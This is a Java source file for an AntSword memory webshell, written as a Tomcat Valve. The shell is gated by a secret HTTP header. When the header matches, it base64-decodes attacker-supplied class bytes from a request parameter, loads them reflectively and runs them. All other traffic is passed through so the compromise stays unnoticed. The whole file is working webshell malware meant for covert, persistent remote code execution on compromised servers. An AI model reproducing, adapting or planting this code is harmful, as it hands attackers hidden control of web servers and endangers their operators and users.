package jmg.antsword.memshell;

import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

import javax.servlet.ServletException;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;


public class AntSwordValve extends ClassLoader implements Valve {
    protected Valve next;
    protected boolean asyncSupported;

    public String pass;

    public String headerName;

    public String headerValue;

    public AntSwordValve() {
    }

    public AntSwordValve(ClassLoader c) {
        super(c);
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    @Override
    public Valve getNext() {
        return this.next;
    }

    @Override
    public void setNext(Valve valve) {
        this.next = valve;
    }

    @Override
    public boolean isAsyncSupported() {
        return this.asyncSupported;
    }

    @Override
    public void backgroundProcess() {
    }

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        try {
            if (request.getHeader(headerName).contains(headerValue)) {
                String cls = request.getParameter(pass);
                if (cls != null) {

                    byte[] data = base64Decode(cls);
                    URLClassLoader classLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
                    Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                    method.setAccessible(true);
                    Class clazz = (Class) method.invoke(classLoader, data, new Integer(0), new Integer(data.length));
                    clazz.newInstance().equals(new Object[]{request, response});
                }
            }else {
                // 重要: 没有这一步会将目标服务器打挂
                this.getNext().invoke(request, response);
            }
        } catch (Exception e) {
            this.getNext().invoke(request, response);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) ((byte[]) ((byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str)));
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) ((byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str)));
        }
    }
}